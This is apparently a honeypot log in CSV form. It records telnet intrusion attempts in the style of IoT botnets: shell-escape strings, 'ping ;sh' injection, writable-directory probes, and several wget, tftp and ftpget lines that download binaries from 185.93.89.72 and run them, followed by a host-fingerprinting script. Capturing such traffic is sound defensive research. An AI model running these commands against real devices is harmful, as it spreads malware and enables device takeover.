1394,3d4ec432cbb1,2026-08-29 02:10:59,,0,system 
1395,3d4ec432cbb1,2026-08-29 02:10:59,,1,shell
1396,3d4ec432cbb1,2026-08-29 02:10:59,,0,shell 
1397,3d4ec432cbb1,2026-08-29 02:10:59,,1,sh
1398,3d4ec432cbb1,2026-08-29 02:10:59,,1,linuxshell
1399,3d4ec432cbb1,2026-08-29 02:10:59,,0,linuxshell 
1400,3d4ec432cbb1,2026-08-29 02:10:59,,1,enablelinuxshell
1401,3d4ec432cbb1,2026-08-29 02:10:59,,0,enablelinuxshell 
1402,3d4ec432cbb1,2026-08-29 02:10:59,,1,ping ;sh
1403,3d4ec432cbb1,2026-08-29 02:10:59,,1,"echo -e ""\x47\x41\x59"""
1404,3d4ec432cbb1,2026-08-29 02:10:59,,1,"cat /proc/mounts; echo -e ""\x47\x41\x59"""
1405,3d4ec432cbb1,2026-08-29 02:11:00,,1,echo -e '\x6b\x61\x6d\x69/dev' > /dev/.nippon; cat /dev/.nippon; rm /dev/.nippon
1406,3d4ec432cbb1,2026-08-29 02:11:00,,1,"echo -e ""\x47\x41\x59"""
1407,3d4ec432cbb1,2026-08-29 02:11:00,,1,rm /dev/.t; rm /dev/.sh; rm /dev/.human
1408,3d4ec432cbb1,2026-08-29 02:11:00,,1,cd /dev/
1409,3d4ec432cbb1,2026-08-29 02:11:00,,1,"cp /bin/echo dvrHelper; >dvrHelper; chmod 777 dvrHelper; echo -e ""\x47\x41\x59"""
1410,3d4ec432cbb1,2026-08-29 02:11:00,,1,cat /bin/echo
1411,3d4ec432cbb1,2026-08-29 02:11:00,,1,"echo -e ""\x47\x41\x59"""
1412,5fc23e75e3c0,2026-08-29 02:11:03,,1,enable
1413,5fc23e75e3c0,2026-08-29 02:11:03,,0,enable 
1414,8a96ab9c7adf,2026-08-29 02:11:03,,1,/bin/busybox
1415,5fc23e75e3c0,2026-08-29 02:11:03,,1,linuxshell
1416,5fc23e75e3c0,2026-08-29 02:11:03,,0,linuxshell 
1417,8a96ab9c7adf,2026-08-29 02:11:04,,1,(tftp -g 185.93.89.72 -r tftp -l- || busybox tftp -g 185.93.89.72 -r tftp -l-) > t; chmod 777 t; ./t; rm -rf t
1418,8a96ab9c7adf,2026-08-29 02:11:04,,1,/bin/busybox
1419,5fc23e75e3c0,2026-08-29 02:11:14,,1,system
1420,5fc23e75e3c0,2026-08-29 02:11:14,,0,system 
1421,8a96ab9c7adf,2026-08-29 02:11:34,,0,./t 
1422,8a96ab9c7adf,2026-08-29 02:11:35,,1,/bin/busybox
1423,8a96ab9c7adf,2026-08-29 02:11:36,,1,(ftpget 185.93.89.72 f ftpget || busybox ftpget 185.93.89.72 f ftpget) > f; chmod 777 f; ./f; rm -rf f
1424,8a96ab9c7adf,2026-08-29 02:11:36,,0,./f 
1425,8a96ab9c7adf,2026-08-29 02:11:36,,1,/bin/busybox
1426,a7d5840f05d5,2026-08-29 02:11:47,,1,enable
1427,a7d5840f05d5,2026-08-29 02:11:47,,0,enable 
1428,a7d5840f05d5,2026-08-29 02:11:47,,1,linuxshell
1429,a7d5840f05d5,2026-08-29 02:11:47,,0,linuxshell 
1430,a7d5840f05d5,2026-08-29 02:11:48,,1,system
1431,a7d5840f05d5,2026-08-29 02:11:48,,0,system 
1432,a7d5840f05d5,2026-08-29 02:11:49,,1,shell
1433,a7d5840f05d5,2026-08-29 02:11:49,,0,shell 
1434,ea9422926fe8,2026-08-29 02:13:12,,1,enable
1435,ea9422926fe8,2026-08-29 02:13:12,,0,enable 
1436,ea9422926fe8,2026-08-29 02:13:12,,1,linuxshell
1437,ea9422926fe8,2026-08-29 02:13:12,,0,linuxshell 
1438,ea9422926fe8,2026-08-29 02:13:13,,1,system
1439,ea9422926fe8,2026-08-29 02:13:13,,0,system 
1440,ea9422926fe8,2026-08-29 02:13:13,,1,shell
1441,ea9422926fe8,2026-08-29 02:13:13,,0,shell 
1442,ea9422926fe8,2026-08-29 02:13:15,,1,sh
1443,a7d5840f05d5,2026-08-29 02:13:18,,1,sh
1444,44cfa1eceef3,2026-08-29 02:13:42,,1,system
1445,44cfa1eceef3,2026-08-29 02:13:42,,0,system 
1446,ea9422926fe8,2026-08-29 02:14:37,,1,/bin/busybox UNSTABLE
1447,a7d5840f05d5,2026-08-29 02:14:45,,1,/bin/busybox UNSTABLE
1448,44cfa1eceef3,2026-08-29 02:15:19,,1,shell
1449,44cfa1eceef3,2026-08-29 02:15:19,,0,shell 
1450,3e792d27a6fe,2026-08-29 02:15:45,,1,enable
1451,3e792d27a6fe,2026-08-29 02:15:45,,0,enable 
1452,44cfa1eceef3,2026-08-29 02:16:26,,1,sh
1453,8ecdb3b8b844,2026-08-29 02:16:26,,1,enable
1454,8ecdb3b8b844,2026-08-29 02:16:26,,0,enable 
1455,3e792d27a6fe,2026-08-29 02:17:12,,1,linuxshell
1456,3e792d27a6fe,2026-08-29 02:17:12,,0,linuxshell 
1457,583d3321183a,2026-08-29 02:17:53,,1,enable
1458,583d3321183a,2026-08-29 02:17:53,,0,enable 
1459,8ecdb3b8b844,2026-08-29 02:18:09,,1,linuxshell
1460,8ecdb3b8b844,2026-08-29 02:18:09,,0,linuxshell 
1461,d654a90e8e7a,2026-08-29 02:18:46,,1,enable
1462,d654a90e8e7a,2026-08-29 02:18:46,,0,enable 
1463,583d3321183a,2026-08-29 02:19:52,,1,linuxshell
1464,583d3321183a,2026-08-29 02:19:52,,0,linuxshell 
1465,18f191e79dc6,2026-08-29 02:19:59,,1,enable
1466,18f191e79dc6,2026-08-29 02:19:59,,0,enable 
1467,d654a90e8e7a,2026-08-29 02:20:05,,1,linuxshell
1468,d654a90e8e7a,2026-08-29 02:20:05,,0,linuxshell 
1469,229b0f746872,2026-08-29 02:20:28,,1,enable
1470,229b0f746872,2026-08-29 02:20:28,,0,enable 
1471,18f191e79dc6,2026-08-29 02:20:38,,1,linuxshell
1472,18f191e79dc6,2026-08-29 02:20:38,,0,linuxshell 
1473,18f191e79dc6,2026-08-29 02:20:38,,1,system
1474,18f191e79dc6,2026-08-29 02:20:38,,0,system 
1475,18f191e79dc6,2026-08-29 02:20:39,,1,shell
1476,18f191e79dc6,2026-08-29 02:20:39,,0,shell 
1477,18f191e79dc6,2026-08-29 02:20:39,,1,sh
1478,016b1065166a,2026-08-29 02:21:33,,1,enable
1479,016b1065166a,2026-08-29 02:21:33,,0,enable 
1480,18f191e79dc6,2026-08-29 02:21:39,,1,/bin/busybox UNSTABLE
1481,229b0f746872,2026-08-29 02:21:40,,1,linuxshell
1482,229b0f746872,2026-08-29 02:21:40,,0,linuxshell 
1483,016b1065166a,2026-08-29 02:22:33,,1,linuxshell
1484,016b1065166a,2026-08-29 02:22:33,,0,linuxshell 
1485,e0034b9a2f6e,2026-08-29 02:23:55,,1,enable
1486,e0034b9a2f6e,2026-08-29 02:23:55,,0,enable 
1487,e0034b9a2f6e,2026-08-29 02:25:36,,1,linuxshell
1488,e0034b9a2f6e,2026-08-29 02:25:36,,0,linuxshell 
1489,45068f8d9f22,2026-08-29 02:26:43,,1,enable
1490,45068f8d9f22,2026-08-29 02:26:43,,0,enable 
1491,45068f8d9f22,2026-08-29 02:26:43,,1,linuxshell
1492,45068f8d9f22,2026-08-29 02:26:43,,0,linuxshell 
1493,45068f8d9f22,2026-08-29 02:26:46,,1,system
1494,45068f8d9f22,2026-08-29 02:26:46,,0,system 
1495,d69a0c53d063,2026-08-29 02:26:50,,1,enable
1496,d69a0c53d063,2026-08-29 02:26:50,,0,enable 
1497,d69a0c53d063,2026-08-29 02:27:00,,1,linuxshell
1498,d69a0c53d063,2026-08-29 02:27:00,,0,linuxshell 
1499,45068f8d9f22,2026-08-29 02:27:53,,1,shell
1500,45068f8d9f22,2026-08-29 02:27:53,,0,shell 
1501,a905de8af42b,2026-08-29 02:28:17,,1,enable
1502,a905de8af42b,2026-08-29 02:28:17,,0,enable 
1503,d69a0c53d063,2026-08-29 02:29:01,,1,system
1504,d69a0c53d063,2026-08-29 02:29:01,,0,system 
1505,45068f8d9f22,2026-08-29 02:29:14,,1,sh
1506,a905de8af42b,2026-08-29 02:29:40,,1,linuxshell
1507,a905de8af42b,2026-08-29 02:29:40,,0,linuxshell 
1508,f4c7dd949200,2026-08-29 02:29:50,,1,enable
1509,f4c7dd949200,2026-08-29 02:29:50,,0,enable 
1510,dd351f665845,2026-08-29 02:29:50,,1,enable
1511,dd351f665845,2026-08-29 02:29:50,,0,enable 
1512,dd351f665845,2026-08-29 02:30:43,,1,linuxshell
1513,dd351f665845,2026-08-29 02:30:43,,0,linuxshell 
1514,f4c7dd949200,2026-08-29 02:30:57,,1,linuxshell
1515,f4c7dd949200,2026-08-29 02:30:57,,0,linuxshell 
1516,a26b9d303be6,2026-08-29 02:31:11,,1,enable
1517,a26b9d303be6,2026-08-29 02:31:11,,0,enable 
1518,d5fc437e0d65,2026-08-29 02:32:04,,1,enable
1519,d5fc437e0d65,2026-08-29 02:32:04,,0,enable 
1520,a26b9d303be6,2026-08-29 02:32:28,,1,linuxshell
1521,a26b9d303be6,2026-08-29 02:32:28,,0,linuxshell 
1522,e5f8703f4051,2026-08-29 02:32:47,,1,enable
1523,e5f8703f4051,2026-08-29 02:32:47,,0,enable 
1524,d5fc437e0d65,2026-08-29 02:33:14,,1,linuxshell
1525,d5fc437e0d65,2026-08-29 02:33:14,,0,linuxshell 
1526,f6a559ed30e0,2026-08-29 02:35:16,,1,enable
1527,f6a559ed30e0,2026-08-29 02:35:16,,0,enable 
1528,f6a559ed30e0,2026-08-29 02:35:20,,1,linuxshell
1529,f6a559ed30e0,2026-08-29 02:35:20,,0,linuxshell 
1530,d74a765f1a37,2026-08-29 02:35:37,,1,enable
1531,d74a765f1a37,2026-08-29 02:35:37,,0,enable 
1532,f6a559ed30e0,2026-08-29 02:36:29,,1,system
1533,f6a559ed30e0,2026-08-29 02:36:29,,0,system 
1534,42364aa9f3a3,2026-08-29 02:36:30,,1,enable
1535,42364aa9f3a3,2026-08-29 02:36:30,,0,enable 
1536,d74a765f1a37,2026-08-29 02:36:58,,1,linuxshell
1537,d74a765f1a37,2026-08-29 02:36:58,,0,linuxshell 
1538,42364aa9f3a3,2026-08-29 02:38:19,,1,linuxshell
1539,42364aa9f3a3,2026-08-29 02:38:19,,0,linuxshell 
1540,583218a76417,2026-08-29 02:38:48,,1,enable
1541,583218a76417,2026-08-29 02:38:48,,0,enable 
1542,583218a76417,2026-08-29 02:38:48,,1,linuxshell
1543,583218a76417,2026-08-29 02:38:48,,0,linuxshell 
1544,118921bbb535,2026-08-29 02:39:37,,1,enable
1545,118921bbb535,2026-08-29 02:39:37,,0,enable 
1546,0fd547cf51d9,2026-08-29 02:39:44,,1,enable
1547,0fd547cf51d9,2026-08-29 02:39:44,,0,enable 
1548,583218a76417,2026-08-29 02:40:01,,1,system
1549,583218a76417,2026-08-29 02:40:01,,0,system 
1550,118921bbb535,2026-08-29 02:40:18,,1,linuxshell
1551,118921bbb535,2026-08-29 02:40:18,,0,linuxshell 
1552,6bb7c29c58fb,2026-08-29 02:40:30,,1,enable
1553,6bb7c29c58fb,2026-08-29 02:40:30,,0,enable 
1554,85311ca32cbc,2026-08-29 02:41:18,,1,enable
1555,85311ca32cbc,2026-08-29 02:41:18,,0,enable 
1556,0fd547cf51d9,2026-08-29 02:41:34,,1,linuxshell
1557,0fd547cf51d9,2026-08-29 02:41:34,,0,linuxshell 
1558,85b36a566bf0,2026-08-29 02:41:51,,1,enable
1559,85b36a566bf0,2026-08-29 02:41:51,,0,enable 
1560,49b727d65c0a,2026-08-29 02:42:52,,1,enable
1561,49b727d65c0a,2026-08-29 02:42:52,,0,enable 
1562,49b727d65c0a,2026-08-29 02:42:52,,1,system
1563,49b727d65c0a,2026-08-29 02:42:52,,0,system 
1564,49b727d65c0a,2026-08-29 02:42:52,,1,shell
1565,49b727d65c0a,2026-08-29 02:42:52,,0,shell 
1566,49b727d65c0a,2026-08-29 02:42:52,,1,sh
1567,49b727d65c0a,2026-08-29 02:42:52,,1,linuxshell
1568,49b727d65c0a,2026-08-29 02:42:52,,0,linuxshell 
1569,49b727d65c0a,2026-08-29 02:42:52,,1,enablelinuxshell
1570,49b727d65c0a,2026-08-29 02:42:52,,0,enablelinuxshell 
1571,49b727d65c0a,2026-08-29 02:42:52,,1,ping ;sh
1572,49b727d65c0a,2026-08-29 02:42:53,,1,"echo -e ""\x47\x41\x59\x46\x47\x54"""
1573,49b727d65c0a,2026-08-29 02:42:54,,1,cd /proc && cat self/cmdline
1574,49b727d65c0a,2026-08-29 02:42:54,,1,"echo -e ""\x47\x41\x59\x46\x47\x54"""
1575,883f2adc487f,2026-08-29 02:44:51,,1,enable
1576,883f2adc487f,2026-08-29 02:44:51,,0,enable 
1577,883f2adc487f,2026-08-29 02:44:51,,1,system
1578,883f2adc487f,2026-08-29 02:44:51,,0,system 
1579,883f2adc487f,2026-08-29 02:44:51,,1,shell
1580,883f2adc487f,2026-08-29 02:44:51,,0,shell 
1581,883f2adc487f,2026-08-29 02:44:51,,1,sh
1582,883f2adc487f,2026-08-29 02:44:51,,1,linuxshell
1583,883f2adc487f,2026-08-29 02:44:51,,0,linuxshell 
1584,883f2adc487f,2026-08-29 02:44:51,,1,enablelinuxshell
1585,883f2adc487f,2026-08-29 02:44:51,,0,enablelinuxshell 
1586,883f2adc487f,2026-08-29 02:44:51,,1,ping ;sh
1587,883f2adc487f,2026-08-29 02:44:52,,1,busybox
1588,883f2adc487f,2026-08-29 02:44:53,,1,cd /proc && cat self/cmdline
1589,883f2adc487f,2026-08-29 02:44:53,,1,/bin/busybox
1590,883f2adc487f,2026-08-29 02:44:54,,1,>/tmp/d && chmod 777 /tmp/d && /tmp/d && cd /tmp/
1591,883f2adc487f,2026-08-29 02:44:54,,1,>/var/d && chmod 777 /var/d && /var/d && cd /var/
1592,883f2adc487f,2026-08-29 02:44:54,,1,>/var/tmp/d && chmod 777 /var/tmp/d && /var/tmp/d && cd /var/tmp/
1593,883f2adc487f,2026-08-29 02:44:54,,1,>/var/run/d && chmod 777 /var/run/d && /var/run/d && cd /var/run/
1594,883f2adc487f,2026-08-29 02:44:54,,1,>/dev/d && chmod 777 /dev/d && /dev/d && cd /dev/
1595,883f2adc487f,2026-08-29 02:44:54,,1,>/dev/shm/d && chmod 777 /dev/shm/d && /dev/shm/d && cd /dev/shm/
1596,883f2adc487f,2026-08-29 02:44:54,,1,>/data/d && chmod 777 /data/d && /data/d && cd /data/
1597,883f2adc487f,2026-08-29 02:44:54,,0,/data/d 
1598,883f2adc487f,2026-08-29 02:44:54,,1,>/etc/d && chmod 777 /etc/d && /etc/d && cd /etc/
1599,883f2adc487f,2026-08-29 02:44:54,,1,>/mnt/d && chmod 777 /mnt/d && /mnt/d && cd /mnt/
1600,883f2adc487f,2026-08-29 02:44:54,,1,>/usr/d && chmod 777 /usr/d && /usr/d && cd /usr/
1601,883f2adc487f,2026-08-29 02:44:54,,1,>/home/d && chmod 777 /home/d && /home/d && cd /home/
1602,883f2adc487f,2026-08-29 02:44:54,,1,>/root/d && chmod 777 /root/d && /root/d && cd /root/
1603,883f2adc487f,2026-08-29 02:44:54,,1,/bin/busybox
1604,883f2adc487f,2026-08-29 02:44:55,,1,(wget http://185.93.89.72/wget -O- || busybox wget http://185.93.89.72/wget -O-) > w; chmod 777 w; ./w; rm -rf w
1605,883f2adc487f,2026-08-29 02:44:55,,0,./w 
1606,883f2adc487f,2026-08-29 02:44:55,,1,/bin/busybox
1607,9331febb0c9b,2026-08-29 02:44:58,,1,enable
1608,9331febb0c9b,2026-08-29 02:44:58,,0,enable 
1609,9331febb0c9b,2026-08-29 02:44:58,,1,system
1610,9331febb0c9b,2026-08-29 02:44:58,,0,system 
1611,9331febb0c9b,2026-08-29 02:44:58,,1,shell
1612,9331febb0c9b,2026-08-29 02:44:58,,0,shell 
1613,9331febb0c9b,2026-08-29 02:44:58,,1,sh
1614,9331febb0c9b,2026-08-29 02:44:58,,1,linuxshell
1615,9331febb0c9b,2026-08-29 02:44:58,,0,linuxshell 
1616,9331febb0c9b,2026-08-29 02:44:58,,1,enablelinuxshell
1617,9331febb0c9b,2026-08-29 02:44:58,,0,enablelinuxshell 
1618,9331febb0c9b,2026-08-29 02:44:58,,1,ping ;sh
1619,9331febb0c9b,2026-08-29 02:44:58,,1,"echo -e ""\x47\x41\x59"""
1620,9331febb0c9b,2026-08-29 02:44:58,,1,"cat /proc/mounts; echo -e ""\x47\x41\x59"""
1621,9331febb0c9b,2026-08-29 02:44:58,,1,echo -e '\x6b\x61\x6d\x69/dev' > /dev/.nippon; cat /dev/.nippon; rm /dev/.nippon
1622,9331febb0c9b,2026-08-29 02:44:58,,1,"echo -e ""\x47\x41\x59"""
1623,9331febb0c9b,2026-08-29 02:44:58,,1,rm /dev/.t; rm /dev/.sh; rm /dev/.human
1624,9331febb0c9b,2026-08-29 02:44:58,,1,cd /dev/
1625,9331febb0c9b,2026-08-29 02:44:58,,1,"cp /bin/echo dvrHelper; >dvrHelper; chmod 777 dvrHelper; echo -e ""\x47\x41\x59"""
1626,9331febb0c9b,2026-08-29 02:44:59,,1,cat /bin/echo
1627,9331febb0c9b,2026-08-29 02:44:59,,1,"echo -e ""\x47\x41\x59"""
1628,883f2adc487f,2026-08-29 02:45:00,,1,/bin/busybox
1629,883f2adc487f,2026-08-29 02:45:01,,1,(tftp -g 185.93.89.72 -r tftp -l- || busybox tftp -g 185.93.89.72 -r tftp -l-) > t; chmod 777 t; ./t; rm -rf t
1630,883f2adc487f,2026-08-29 02:45:01,,1,/bin/busybox
1631,0988a79e9871,2026-08-29 02:45:04,,1,enable
1632,0988a79e9871,2026-08-29 02:45:04,,0,enable 
1633,0988a79e9871,2026-08-29 02:45:05,,1,linuxshell
1634,0988a79e9871,2026-08-29 02:45:05,,0,linuxshell 
1635,0988a79e9871,2026-08-29 02:45:08,,1,system
1636,0988a79e9871,2026-08-29 02:45:08,,0,system 
1637,0988a79e9871,2026-08-29 02:45:16,,1,shell
1638,0988a79e9871,2026-08-29 02:45:16,,0,shell 
1639,3f4c2b1eaeec,2026-08-29 02:45:19,,1,enable
1640,3f4c2b1eaeec,2026-08-29 02:45:19,,0,enable 
1641,883f2adc487f,2026-08-29 02:45:31,,0,./t 
1642,883f2adc487f,2026-08-29 02:45:31,,1,/bin/busybox
1643,883f2adc487f,2026-08-29 02:45:32,,1,(ftpget 185.93.89.72 f ftpget || busybox ftpget 185.93.89.72 f ftpget) > f; chmod 777 f; ./f; rm -rf f
1644,883f2adc487f,2026-08-29 02:45:32,,0,./f 
1645,883f2adc487f,2026-08-29 02:45:32,,1,/bin/busybox
1646,0988a79e9871,2026-08-29 02:46:40,,1,sh
1647,3f4c2b1eaeec,2026-08-29 02:46:45,,1,linuxshell
1648,3f4c2b1eaeec,2026-08-29 02:46:45,,0,linuxshell 
1649,0cf543626fed,2026-08-29 02:47:17,,1,enable
1650,0cf543626fed,2026-08-29 02:47:17,,0,enable 
1651,0988a79e9871,2026-08-29 02:47:22,,1,/bin/busybox UNSTABLE
1652,3f4c2b1eaeec,2026-08-29 02:47:54,,1,system
1653,3f4c2b1eaeec,2026-08-29 02:47:54,,0,system 
1654,0cf543626fed,2026-08-29 02:48:25,,1,linuxshell
1655,0cf543626fed,2026-08-29 02:48:25,,0,linuxshell 
1656,ed166c65a320,2026-08-29 02:48:32,,1,enable
1657,ed166c65a320,2026-08-29 02:48:32,,0,enable 
1658,fff41e1ab776,2026-08-29 02:49:34,,1,enable
1659,fff41e1ab776,2026-08-29 02:49:34,,0,enable 
1660,fff41e1ab776,2026-08-29 02:51:23,,1,linuxshell
1661,fff41e1ab776,2026-08-29 02:51:23,,0,linuxshell 
1662,009b2eb0f210,2026-08-29 02:52:01,,1,enable
1663,009b2eb0f210,2026-08-29 02:52:01,,0,enable 
1664,d3ec14de8b43,2026-08-29 02:52:30,,1,enable
1665,d3ec14de8b43,2026-08-29 02:52:30,,0,enable 
1666,d3ec14de8b43,2026-08-29 02:52:55,,1,linuxshell
1667,d3ec14de8b43,2026-08-29 02:52:55,,0,linuxshell 
1668,78561fab5e27,2026-08-29 02:53:21,,1,"export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH
uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '""' ) || echo """")
arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox uname -m 2>/dev/null || ( [ -f /proc/cpuinfo ] && grep -q ""lm"" /proc/cpuinfo && echo x86_64 ) || ( [ -f /proc/cpuinfo ] && grep -q ""CPU architecture: 8"" /proc/cpuinfo && echo aarch64 ) || ( [ -f /proc/cpuinfo ] && grep -q ""CPU architecture: 7"" /proc/cpuinfo && echo armv7l ) || echo """")
uptime=$(cat /proc/uptime 2>/dev/null || busybox cat /proc/uptime 2>/dev/null)
cpus=$(nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || busybox nproc 2>/dev/null || grep -c ""^processor"" /proc/cpuinfo 2>/dev/null)
cpu_model=$( { lscpu 2>/dev/null | awk -F: '/Model name/ {print $2}'; grep -m1 -E ""^model name"" /proc/cpuinfo 2>/dev/null | cut -d: -f2-; grep -m1 -E ""^Hardware"" /proc/cpuinfo 2>/dev/null | cut -d: -f2-; cat /proc/device-tree/model 2>/dev/null; } | sed '/^$/d; /unknown/d; s/^[[:space:]]*//; s/[[:space:]]*$//; s/ AArch64 Processor$//; s/ Processor$//; s/ CPU$//' | head -1 )
gpu_info=$( (lspci 2>/dev/null | grep -i vga; lspci 2>/dev/null | grep -i nvidia; busybox lspci 2>/dev/null | grep -i vga; busybox lspci 2>/dev/null | grep -i nvidia) 2>/dev/null )
last_output=$(last 2>/dev/null)
filter_output=$( ( export LANG=C LC_ALL=C; echo '===SHELL_BEHAVIOR==='; printf 'path_err='; ( ./xxxxxx 2>&1 || true ) | ( head -c 250 2>/dev/null || busybox head -c 250 2>/dev/null || dd bs=250 count=1 2>/dev/null ) | ( tr -d '\n' 2>/dev/null || busybox tr -d '\n' 2>/dev/null || cat ); printf '\n'; printf 'cmd_err='; ( xxxxxx 2>&1 || true ) | ( head -c 250 2>/dev/null || busybox head -c 250 2>/dev/null || dd bs=250 count=1 2>/dev/null ) | ( tr -d '\n' 2>/dev/null || busybox tr -d '\n' 2>/dev/null || cat ); printf '\n'; printf 'execute_err='; out=$(bash -c 'printf ""#!/bin/bash\necho \""xxxxxx\""\n"" > filter && chmod +x filter && ./filter && rm -rf filter' 2>&1); case ""$out"" in *xxxxxx*) ;; *) out=$(/bin/bash -c 'printf ""#!/bin/bash\necho \""xxxxxx\""\n"" > filter && chmod +x filter && ./filter && rm -rf filter' 2>&1); case ""$out"" in *xxxxxx*) ;; *) out=$(/usr/bin/bash -c 'printf ""#!/bin/bash\necho \""xxxxxx\""\n"" > filter && chmod +x filter && ./filter && rm -rf filter' 2>&1); case ""$out"" in *xxxxxx*) ;; *) out=$(busybox sh -c 'printf ""#!/bin/sh\necho \""xxxxxx\""\n"" > filter && chmod +x filter && ./filter && rm -rf filter' 2>&1 || sh -c 'printf ""#!/bin/sh\necho \""xxxxxx\""\n"" > filter && chmod +x filter && ./filter && rm -rf filter' 2>&1); esac; esac; esac; printf '%s' ""$out"" | ( head -c 250 2>/dev/null || busybox head -c 250 2>/dev/null || dd bs=250 count=1 2>/dev/null ) | ( tr -d '\n' 2>/dev/null || busybox tr -d '\n' 2>/dev/null || cat ); printf '\n'; echo '===DONE===' ) 2>&1 )
echo ""UNAME:$uname""
echo ""ARCH:$arch""
echo ""UPTIME:$uptime""
echo ""CPUS:$cpus""
echo ""CPU_MODEL:$cpu_model""
echo ""GPU:$gpu_info""
echo ""LAST:$last_output""
echo ""FILTER:$filter_output"""
